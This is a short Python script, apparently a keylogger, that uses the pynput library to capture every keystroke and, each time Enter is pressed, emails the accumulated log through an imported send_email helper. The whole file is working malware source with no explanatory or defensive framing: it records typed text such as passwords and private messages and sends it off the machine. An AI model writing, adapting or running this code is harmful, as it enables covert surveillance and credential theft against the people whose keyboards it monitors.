from pynput.keyboard import Key, Listener
import send_email
full_log = ''
word = ''

keys = []

def on_press(key):
    global full_log
    global word
    
    if key == Key.enter:
        full_log+=word
        email(full_log)
        full_log = ''
        word = '' 
    elif key==Key.backspace:
        word = word[:-1]
    elif key==Key.shift_l or key == Key.shift_r:
        return
    else:
        char = f'{key}'
        char = char[1:-1]
        word+=char
        print(word)
    if key == Key.esc:
        return False
def email(message):
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()